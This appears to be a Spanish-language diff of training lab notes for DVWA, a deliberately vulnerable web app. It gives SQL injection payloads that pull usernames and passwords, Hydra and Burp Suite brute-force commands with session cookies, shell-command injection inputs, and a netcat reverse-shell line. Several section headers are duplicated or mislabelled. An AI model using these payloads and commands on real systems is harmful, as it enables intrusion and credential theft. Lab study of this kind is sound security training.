+ ____) | |__| | |____   _| |_| | | | |  __/ (__| |_| | (_) | | | |
+|_____/ \___\_\______| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
+
+Parte 2:
+	Command Execution
+
+NIVEL-SEGURIDAD: MEDIUM
+
+=======================================================================================================
+
+### Realizar una Inyección SQL en DVWA en Nivel de Seguridad Medio
+
+**Contexto**:
+En DVWA (Damn Vulnerable Web Application), el nivel de seguridad medio para la vulnerabilidad de inyección SQL implementa ciertas medidas de protección para evitar ataques triviales. Sin embargo, con un entendimiento adecuado de cómo funcionan las consultas SQL y las vulnerabilidades de inyección, aún es posible explotar estas debilidades.
+
+**Objetivo**:
+Extraer nombres de usuario y contraseñas de la base de datos `users` utilizando una inyección SQL en el nivel de seguridad medio de DVWA.
+
+**Paso a Paso**:
+
+1. **Accede a la Página de Inyección SQL**:
+   - Abre tu navegador web y navega a la interfaz de DVWA.
+   - Inicia sesión y selecciona la opción "SQL Injection" desde el menú de vulnerabilidades.
+
+2. **Entender el Campo de Entrada**:
+   - La aplicación generalmente presenta un campo de entrada donde puedes ingresar un ID de usuario para consultar información específica.
+   - En nivel de seguridad medio, la aplicación realiza algunas validaciones básicas pero no lo suficiente para prevenir todas las inyecciones SQL.
+
+3. **Capturar la Solicitud HTTP con Burp Suite**:
+   - Configura Burp Suite para interceptar las solicitudes HTTP entre tu navegador y DVWA.
+   - Navega a la página de SQL Injection en DVWA y envía una solicitud con un ID de usuario.
+   - En Burp Suite, captura y guarda la solicitud HTTP generada.
+
+4. **Construir una Inyección SQL más Compleja**:
+   - Abre la solicitud capturada en Burp Suite y modifícala para incluir la inyección SQL.
+   - La inyección SQL que usaremos es:
+     ```plaintext
+     id=1 UNION SELECT user, password FROM users -- &Submit=Submit
+     ```
+   - **Desglose del Comando**:
+     - `id=1`: Es el inicio de la consulta SQL original que espera un ID de usuario.
+     - `UNION SELECT user, password FROM users`: Este segmento añade una consulta adicional que une los resultados de la tabla `users`, específicamente los campos `user` y `password`.
+     - `--`: Los dos guiones seguidos indican un comentario en SQL, lo que significa que cualquier cosa después de este símbolo será ignorada por la base de datos.
+     - `&Submit=Submit`: Esta es la manera en que la aplicación web envía el formulario, incluyendo el parámetro `Submit`.
+
+5. **Ejecutar la Inyección**:
+   - Envía la solicitud modificada con la inyección SQL a través de Burp Suite.
+   - Si la aplicación es vulnerable, debería devolver los nombres de usuario y contraseñas de la tabla `users`.
+
+**Explicación**:
+- **Inyección SQL**: La inyección SQL es una técnica de ataque que explota una vulnerabilidad en una aplicación al manipular las consultas SQL que se envían a la base de datos. En este caso, estamos insertando una consulta adicional utilizando `UNION SELECT` para combinar los resultados de la consulta legítima con la consulta maliciosa.
+- **Uso de Burp Suite**: Burp Suite es una herramienta ampliamente utilizada para realizar pruebas de seguridad en aplicaciones web. Permite capturar, modificar y analizar las solicitudes HTTP, lo que facilita la identificación y explotación de vulnerabilidades como la inyección SQL.
+
+Sentencia SQL para Burp Suite:
+
+id=1 UNION SELECT user, password FROM users -- &Submit=Submit
+
+=======================================================================================================
+
+  _____  ____  _        _____       _           _   _             
+ / ____|/ __ \| |      |_   _|     (_)         | | (_)            
+| (___ | |  | | |        | |  _ __  _  ___  ___| |_ _  ___  _ __  
+ \___ \| |  | | |        | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
+ ____) | |__| | |____   _| |_| | | | |  __/ (__| |_| | (_) | | | |
+|_____/ \___\_\______| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
+
+Parte 3:
+  Command Execution
+
+NIVEL-SEGURIDAD: HIGH
+
+=======================================================================================================
+
+### Comando Utilizado:
+
+1' UNION SELECT user,password FROM users#
+
+### Explicación:
+
+- **Contexto**:
+  Esta sección explica cómo realizar una inyección SQL en DVWA (Damn Vulnerable Web Application) en el nivel de seguridad alto.
+
+- **Command Execution**:
+  La ejecución de comandos se refiere a la capacidad de ejecutar comandos del sistema a través de vulnerabilidades en aplicaciones web. En este caso, utilizamos una vulnerabilidad de inyección SQL para obtener datos sensibles.
+
+- **NIVEL-SEGURIDAD: HIGH**:
+  En DVWA, el nivel de seguridad alto incluye medidas de protección más robustas, como validaciones y sanitización de entradas. Sin embargo, aún pueden existir vulnerabilidades explotables con técnicas avanzadas.
+
+### Paso a Paso: Realizar una Inyección SQL en DVWA en Nivel de Seguridad Alto
+
+1. **Accede a la Página de SQL Injection**:
+   - Abre tu navegador web y navega a la interfaz de DVWA.
+   - Inicia sesión y selecciona la opción "SQL Injection" desde el menú de vulnerabilidades.
+
+2. **Entender el Campo de Entrada**:
+   - La aplicación presenta un campo de entrada donde puedes ingresar un ID de usuario para consultar información específica.
+
+3. **Capturar la Solicitud HTTP con Burp Suite**:
+   - Configura Burp Suite para interceptar las solicitudes HTTP entre tu navegador y DVWA.
+   - Navega a la página de SQL Injection en DVWA y envía una solicitud con un ID de usuario.
+   - En Burp Suite, captura y guarda la solicitud HTTP generada.
+
+4. **Construir una Inyección SQL más Compleja**:
+   - Abre la solicitud capturada en Burp Suite y modifícala para incluir la inyección SQL:
+     ```sql
+     id=1 UNION SELECT user, password FROM users -- &Submit=Submit
+     ```
+   - **Desglose del Comando**:
+     - `id=1`: Es el inicio de la consulta SQL original que espera un ID de usuario.
+     - `UNION SELECT user, password FROM users`: Este segmento añade una consulta adicional que une los resultados de la tabla `users`, específicamente los campos `user` y `password`.
+     - `--`: Los dos guiones seguidos indican un comentario en SQL, lo que significa que cualquier cosa después de este símbolo será ignorada por la base de datos.
+     - `&Submit=Submit`: Esta es la manera en que la aplicación web envía el formulario, incluyendo el parámetro `Submit`.
+
+5. **Ejecutar la Inyección**:
+   - Envía la solicitud modificada con la inyección SQL a través de Burp Suite.
+   - Si la aplicación es vulnerable, debería devolver los nombres de usuario y contraseñas de la tabla `users`.
+
+**Explicación**:
+- **Inyección SQL**: La inyección SQL es una técnica de ataque que explota una vulnerabilidad en una aplicación al manipular las consultas SQL que se envían a la base de datos. En este caso, estamos insertando una consulta adicional utilizando `UNION SELECT` para combinar los resultados de la consulta legítima con la consulta maliciosa.
+- **Uso de Burp Suite**: Burp Suite es una herramienta ampliamente utilizada para realizar pruebas de seguridad en aplicaciones web. Permite capturar, modificar y analizar las solicitudes HTTP, lo que facilita la identificación y explotación de vulnerabilidades como la inyección SQL.
+
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+
+Parte 1:
+	Brute Force with Bursuip
+
+NIVEL-SEGURIDAD: LOW
+
+=======================================================================================================
+
+ ____                             _ _       
+|  _ \                           (_) |      
+| |_) |_   _ _ __ _ __  ___ _   _ _| |_ ___ 
+|  _ <| | | | '__| '_ \/ __| | | | | __/ _ \
+| |_) | |_| | |  | |_) \__ \ |_| | | ||  __/
+|____/ \__,_|_|  | .__/|___/\__,_|_|\__\___|
+                 | |                        
+                 |_|                        
+
+Preparación del entorno:
+
+1. Asegúrate de tener instalado DVWA y Burp Suite en tu máquina.
+2. Inicia DVWA y accede a él en tu navegador web.
+
+Configuración de Burp Suite:
+
+1. Abre Burp Suite y asegúrate de que esté configurado correctamente para interceptar el tráfico HTTP entre tu navegador y el servidor DVWA. Puedes hacerlo configurando tu navegador para que use un proxy en la dirección IP y el puerto donde Burp Suite esté escuchando (por defecto, 127.0.0.1:8080).
+2. Habilita el interceptor en Burp Suite.
+
+Selecciona el formulario de inicio de sesión:
+
+1. En el navegador, navega hasta la página de inicio de sesión de DVWA.
+2. Haz clic derecho en la página y selecciona "Enviar a Intruder" en el menú contextual de Burp Suite.
+
+Configuración del ataque de fuerza bruta en Burp Suite:
+
+1. En Burp Suite, ve a la pestaña "Intruder".
+2. En la sección "Posiciones", asegúrate de que el campo de usuario y contraseña estén seleccionados.
+3. En la pestaña "Peticiones", asegúrate de que la solicitud de inicio de sesión esté seleccionada.
+4. En la pestaña "Atacante", selecciona el tipo de ataque como "Fuerza Bruta".
+5. Configura las listas de payloads para los campos de usuario y contraseña según tus necesidades.
+
+Ejecución del ataque:
+
+1. Haz clic en el botón "Iniciar ataque" en Burp Suite para iniciar el ataque de fuerza bruta.
+2. Burp Suite enviará las solicitudes automáticamente, probando diferentes combinaciones de nombres de usuario y contraseñas.
+
+Guardar resultados en un archivo de texto:
+
+1. Una vez que el ataque haya finalizado, ve a la pestaña "Intruder" y haz clic en la pestaña "Resultados".
+2. Selecciona los resultados que deseas guardar, puedes hacer clic derecho y seleccionar "Guardar resultados" para guardarlos en un archivo de texto.
+
+=======================================================================================================
+
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+Parte 2:
+	Brute Force with Hydra
+
+NIVEL-SEGURIDAD: LOW
+
+=======================================================================================================
+
+ _    ___     _______  _____            
+| |  | \ \   / /  __ \|  __ \     /\    
+| |__| |\ \_/ /| |  | | |__) |   /  \   
+|  __  | \   / | |  | |  _  /   / /\ \  
+| |  | |  | |  | |__| | | \ \  / ____ \ 
+|_|  |_|  |_|  |_____/|_|  \_\/_/    \_\
+
+Pasos para realizar un ataque de fuerza bruta con Hydra en DVWA:
+
+1. Preparación del entorno:
+
+   - Asegúrate de tener Hydra instalado en tu sistema.
+   - Identifica la URL del formulario de inicio de sesión en DVWA.
+
+2. Selecciona un usuario y un diccionario de contraseñas:
+
+   - Escoge un usuario válido para el ataque.
+   - Selecciona un diccionario de contraseñas que contenga posibles combinaciones de contraseñas.
+
+3. Ejecuta el comando Hydra:
+
+   - Utiliza el siguiente formato de comando:
+
+     ```bash
+     hydra -l <usuario> -P <diccionario> 'http-get-form://<URL_formulario>:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=<valor_PHPSESSID>; security=low:F=Username and/or password incorrect'
+     ```
+
+     - Reemplaza `<usuario>` con el nombre de usuario que deseas probar.
+     - Reemplaza `<diccionario>` con la ruta al archivo de diccionario que contiene las contraseñas.
+     - Reemplaza `<URL_formulario>` con la URL del formulario de inicio de sesión en DVWA.
+     - Asegúrate de incluir el valor correcto de `PHPSESSID` en el encabezado de Cookie.
+     - Ajusta el nivel de seguridad (`security`) según corresponda.
+
+4. Ejecuta el comando:
+
+   - Abre una terminal y ejecuta el comando Hydra.
+
+5. Espera a que finalice el ataque:
+
+   - Hydra probará cada contraseña del diccionario contra el usuario especificado en el formulario de inicio de sesión.
+
+6. Analiza los resultados:
+
+   - Una vez que el ataque haya finalizado, analiza los resultados para determinar si alguna contraseña fue exitosa.
+
+Ejemplo de comando:
+
+hydra -l <usuario> -P <diccionario> 'http-get-form://192.168.0.29/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=gsv2pro46rv3migslo8fqbig0p; security=low:F=Username and/or password incorrect'
+
+Comando prueba:
+
+hydra -l thx1 -P john.lst 'http-get-form://192.168.0.29/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=gsv2pro46rv3migslo8fqbig0p; security=low:F=Username and/or password incorrect'
+
+=======================================================================================================
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+
+Parte 3:
+	Brute Force with Bursuip
+
+NIVEL-SEGURIDAD: MEDIUM
+
+=======================================================================================================
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+Parte 3:
+	Brute Force with Burp Suite
+
+NIVEL-SEGURIDAD: MEDIO
+
+=======================================================================================================
+
+Explicación:
+Un ataque de fuerza bruta en DVWA en nivel medio implica los mismos pasos que en nivel bajo, pero se espera que tome más tiempo encontrar la contraseña debido a la complejidad potencialmente mayor de las contraseñas y al ajuste del nivel de seguridad en el servidor.
+
+Preparación del entorno:
+
+1. Asegúrate de tener instalado DVWA y Burp Suite en tu máquina.
+2. Inicia DVWA y accede a él en tu navegador web.
+
+Configuración de Burp Suite:
+
+1. Abre Burp Suite y asegúrate de que esté configurado correctamente para interceptar el tráfico HTTP entre tu navegador y el servidor DVWA. Puedes hacerlo configurando tu navegador para que use un proxy en la dirección IP y el puerto donde Burp Suite esté escuchando (por defecto, 127.0.0.1:8080).
+2. Habilita el interceptor en Burp Suite.
+
+Selecciona el formulario de inicio de sesión:
+
+1. En el navegador, navega hasta la página de inicio de sesión de DVWA.
+2. Haz clic derecho en la página y selecciona "Enviar a Intruder" en el menú contextual de Burp Suite.
+
+Configuración del ataque de fuerza bruta en Burp Suite:
+
+1. En Burp Suite, ve a la pestaña "Intruder".
+2. En la sección "Posiciones", asegúrate de que el campo de usuario y contraseña estén seleccionados.
+3. En la pestaña "Peticiones", asegúrate de que la solicitud de inicio de sesión esté seleccionada.
+4. En la pestaña "Atacante", selecciona el tipo de ataque como "Fuerza Bruta".
+5. Configura las listas de payloads para los campos de usuario y contraseña según tus necesidades.
+
+Ejecución del ataque:
+
+1. Haz clic en el botón "Iniciar ataque" en Burp Suite para iniciar el ataque de fuerza bruta.
+2. Burp Suite enviará las solicitudes automáticamente, probando diferentes combinaciones de nombres de usuario y contraseñas.
+
+Guardar resultados en un archivo de texto:
+
+1. Una vez que el ataque haya finalizado, ve a la pestaña "Intruder" y haz clic en la pestaña "Resultados".
+2. Selecciona los resultados que deseas guardar, puedes hacer clic derecho y seleccionar "Guardar resultados" para guardarlos en un archivo de texto.
+
+=======================================================================================================
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+Parte 4:
+	Brute Force with Hydra
+
+NIVEL-SEGURIDAD: MEDIUM
+
+=======================================================================================================
+ _    ___     _______  _____            
+| |  | \ \   / /  __ \|  __ \     /\    
+| |__| |\ \_/ /| |  | | |__) |   /  \   
+|  __  | \   / | |  | |  _  /   / /\ \  
+| |  | |  | |  | |__| | | \ \  / ____ \ 
+|_|  |_|  |_|  |_____/|_|  \_\/_/    \_\
+
+Igual que con el nivel low Asegúrate de ajustar adecuadamente los valores de la cookie y 
+PHPSESSID y de comprender el nivel de seguridad medio antes de ejecutar el ataque. Además, 
+ten en cuenta que debido al aumento en la complejidad de las contraseñas y el mayor número de intentos, 
+el tiempo necesario para completar el ataque puede ser significativamente más largo que en el nivel de 
+seguridad bajo.
+
+Ejemplo de comando:
+
+hydra -l <usuario> -P <diccionario> 'http-get-form://192.168.0.29/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=gsv2pro46rv3migslo8fqbig0p; security=medium:F=Username and/or password incorrect'
+
+Comando prueba:
+
+hydra -l thx1 -P john.lst 'http-get-form://192.168.0.29/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=3ruc81fdf6em5hecpnauvk5e67; security=medium:F=Username and/or password incorrect' -V -I
+
+=======================================================================================================
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+Parte 5:
+	Brute Force con Burp Suite
+
+NIVEL-SEGURIDAD: HIGH
+
+=======================================================================================================
+
+Explicación:
+Un ataque de fuerza bruta en DVWA en nivel alto implica los mismos pasos que en niveles más bajos, pero es probable que tome mucho más tiempo debido a las medidas de seguridad adicionales implementadas en el servidor, como bloqueos de IP tras múltiples intentos fallidos o requisitos de complejidad de contraseña más estrictos.
+
+Preparación del entorno:
+
+1. Asegúrate de tener instalado DVWA y Burp Suite en tu máquina.
+2. Inicia DVWA y accede a él en tu navegador web.
+
+Configuración de Burp Suite:
+
+1. Abre Burp Suite y asegúrate de que esté configurado correctamente para interceptar el tráfico HTTP entre tu navegador y el servidor DVWA. Puedes hacerlo configurando tu navegador para que use un proxy en la dirección IP y el puerto donde Burp Suite esté escuchando (por defecto, 127.0.0.1:8080).
+2. Habilita el interceptor en Burp Suite.
+
+Selecciona el formulario de inicio de sesión:
+
+1. En el navegador, navega hasta la página de inicio de sesión de DVWA.
+2. Haz clic derecho en la página y selecciona "Enviar a Intruder" en el menú contextual de Burp Suite.
+
+Configuración del ataque de fuerza bruta en Burp Suite:
+
+1. En Burp Suite, ve a la pestaña "Intruder".
+2. En la sección "Posiciones", asegúrate de que el campo de usuario y contraseña estén seleccionados.
+3. En la pestaña "Peticiones", asegúrate de que la solicitud de inicio de sesión esté seleccionada.
+4. En la pestaña "Atacante", selecciona el tipo de ataque como "Fuerza Bruta".
+5. Configura las listas de payloads para los campos de usuario y contraseña según tus necesidades.
+
+Ejecución del ataque:
+
+1. Haz clic en el botón "Iniciar ataque" en Burp Suite para iniciar el ataque de fuerza bruta.
+2. Burp Suite enviará las solicitudes automáticamente, probando diferentes combinaciones de nombres de usuario y contraseñas.
+
+Guardar resultados en un archivo de texto:
+
+1. Una vez que el ataque haya finalizado, ve a la pestaña "Intruder" y haz clic en la pestaña "Resultados".
+2. Selecciona los resultados que deseas guardar, puedes hacer clic derecho y seleccionar "Guardar resultados" para guardarlos en un archivo de texto.
+
+=======================================================================================================
+ ____             _         ______                 
+|  _ \           | |       |  ____|                
+| |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___ 
+|  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \
+| |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|
+
+Parte 6:
+	Ataque de fuerza bruta 
+
+NIVEL: HIGH
+
+=======================================================================================================
+ _    ___     _______  _____            
+| |  | \ \   / /  __ \|  __ \     /\    
+| |__| |\ \_/ /| |  | | |__) |   /  \   
+|  __  | \   / | |  | |  _  /   / /\ \  
+| |  | |  | |  | |__| | | \ \  / ____ \ 
+|_|  |_|  |_|  |_____/|_|  \_\/_/    \_\
+
+Explicación sobre falsos negativos con Hydra en el nivel de configuración alto:
+
+Cuando se utiliza Hydra en un nivel de seguridad alto en DVWA, existe la posibilidad de que se produzcan falsos negativos. Esto significa que Hydra puede indicar que una contraseña es incorrecta cuando en realidad es válida, o puede que el proceso de ataque no tenga éxito debido a las medidas de seguridad adicionales implementadas en el servidor.
+
+Algunas de las razones por las que pueden ocurrir falsos negativos en el nivel de configuración alto incluyen:
+
+1. **Bloqueos de IP**: El servidor puede estar configurado para bloquear la dirección IP después de un cierto número de intentos fallidos de inicio de sesión. Esto puede hacer que Hydra no pueda completar el ataque correctamente.
+
+2. **Requisitos de complejidad de contraseña**: En un nivel de seguridad alto, es probable que el servidor requiera contraseñas más complejas, como una combinación de letras mayúsculas y minúsculas, números y caracteres especiales. Si las contraseñas en el diccionario no cumplen con estos requisitos, Hydra puede no encontrar la contraseña correcta.
+
+3. **Detección de ataques de fuerza bruta**: El servidor puede tener medidas adicionales para detectar y bloquear ataques de fuerza bruta, como la detección de patrones de comportamiento inusual. Esto puede causar que Hydra sea bloqueado o que los intentos de inicio de sesión sean rechazados.
+
+En resumen, al utilizar Hydra en un nivel de configuración alto, es importante tener en cuenta la posibilidad de falsos negativos y entender que el proceso de ataque puede ser más complejo y menos efectivo debido a las medidas de seguridad adicionales implementadas en el servidor.
+
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+  _____                                          _   ______                     _   _             
+ / ____|                                        | | |  ____|                   | | (_)            
+| |     ___  _ __ ___  _ __ ___   __ _ _ __   __| | | |__  __  _____  ___ _   _| |_ _  ___  _ __  
+| |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` | |  __| \ \/ / _ \/ __| | | | __| |/ _ \| '_ \ 
+| |___| (_) | | | | | | | | | | | (_| | | | | (_| | | |____ >  <  __/ (__| |_| | |_| | (_) | | | |
+ \_____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_| |______/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|
+
+Parte 5
+	Command Execution
+
+Command Execution (ejecución de comandos) es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante ejecutar comandos del sistema operativo en el servidor que hospeda la aplicación. Esta vulnerabilidad ocurre cuando la aplicación web no valida o sanitiza adecuadamente las entradas proporcionadas por el usuario, permitiendo que los atacantes inyecten y ejecuten comandos arbitrarios.
+
+NIVEL: LOW
+
+=======================================================================================================
+
+=> <hostname or ip> && ls
+
+<hostname or ip> es una dirección IP local que usualmente se usa para pruebas.
+
+&& es un operador de shell que permite ejecutar múltiples comandos secuencialmente. Si el primer comando se ejecuta con éxito (es decir, devuelve un estado de salida cero), el segundo comando se ejecuta.
+
+ls es un comando de Linux que lista los archivos y directorios en el directorio actual.ls
+
+Resultado: La aplicación ejecutará <hostname or ip> (probablemente ignorable) y luego ejecutará ls, mostrando el contenido del directorio.
+
+=> <hostname or ip> & ls
+
+& es un operador de shell que ejecuta el primer comando en segundo plano y luego ejecuta el segundo comando inmediatamente.
+
+ls es el comando que lista los archivos y directorios.
+
+Resultado: Similar al anterior, <hostname or ip>  se ejecutará en segundo plano (probablemente ignorable) y ls se ejecutará inmediatamente después, listando el contenido del directorio.
+
+=> <hostname or ip>; ls 
+
+; es un operador de shell que permite ejecutar múltiples comandos secuencialmente sin importar el estado de salida del primer comando.
+
+ls lista los archivos y directorios.
+
+Resultado: Ejecuta <hostname or ip> y luego ejecuta ls independientemente del éxito o fracaso del primer comando, listando el contenido del directorio
+
+=> <hostname or ip> | ls
+
+| es un operador de tubería que toma la salida del primer comando como entrada del segundo.
+
+ls lista los archivos y directorios
+
+=> <hostname or ip> && nc -c sh <hostname or ip> 9001
+
+nc es netcat, una herramienta de red que puede leer y escribir datos a través de conexiones de red.
+
+-c sh le dice a nc que ejecute un shell (sh) al conectarse.
+
+<hostname or ip> 9001 especifica la dirección IP y el puerto al cual nc debe conectarse.
+
+Resultado: Si se ejecuta correctamente, este comando intentará establecer una conexión de red inversa (reverse shell) al <hostname or ip>  en el puerto 9001. Esto permite al atacante ejecutar comandos en el servidor desde su propia máquina.
+
+ejemplo que si funciona 
+
+<hostname or ip>; neofetch
+
+=======================================================================================================
+
+Parte 6
+	Command Execution
+
+NIVEL: MEDIUM
+
+=======================================================================================================
+
+En DVWA (Damn Vulnerable Web Application) con la dificultad configurada en "Medium", se realiza una sanitización básica de entradas para prevenir la ejecución de comandos del sistema. Específicamente, los caracteres & y ; están bloqueados. Sin embargo, todavía es posible ejecutar comandos utilizando otros operadores.
+
+Ejemplos de Command Execution en DVWA Medium
+Uso del operador de tubería (|):
+
+=> <hostname or ip> | <command>
+Explicación: El operador | redirige la salida del comando ping como entrada para el comando ls.
+Resultado: Ejecuta ping y luego ls, listando los archivos en el servidor.
+Uso de la barra diagonal (/):
+
+=> <hostname or ip> / <command>
+Explicación: Dependiendo de cómo el shell interpreta /, puede permitir la ejecución de ls después de ping.
+Resultado: Ejecuta ping y luego ls.
+
+ejemplo que si funciona 
+
+<hostname or ip> | neofetch
+
+=======================================================================================================
+
+Parte 6
+	Command Execution
+
+NIVEL: HIGH
+
+=======================================================================================================
+
+En DVWA High, se implementan medidas de seguridad más estrictas para prevenir la ejecución de comandos del sistema. La aplicación filtra y bloquea caracteres especiales y operadores comunes utilizados para inyectar comandos. Los intentos de inyección de comandos, como | y /, son rechazados. Esto reduce significativamente el riesgo de inyecciones de comandos y mejora la seguridad de la aplicación.
+
+ejemplo que si funciona 
+
+<hostname or ip> |neofetch
+
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+  _____  _____ _____  ______ 
+ / ____|/ ____|  __ \|  ____|
+| |    | (___ | |__) | |__   
+| |     \___ \|  _  /|  __|  
+| |____ ____) | | \ \| |     
+ \_____|_____/|_|  \_\_|     
+
+Parte 5
+	Command Execution
+
+El CSRF (Cross-Site Request Forgery) es un tipo de ataque en el que un atacante puede engañar a un usuario para que realice acciones no deseadas en un sitio web en el que el usuario está autenticado. El atacante aprovecha la confianza que el sitio web tiene en el usuario autenticado para enviar solicitudes no autorizadas en su nombre.
+
+NIVEL: LOW
+
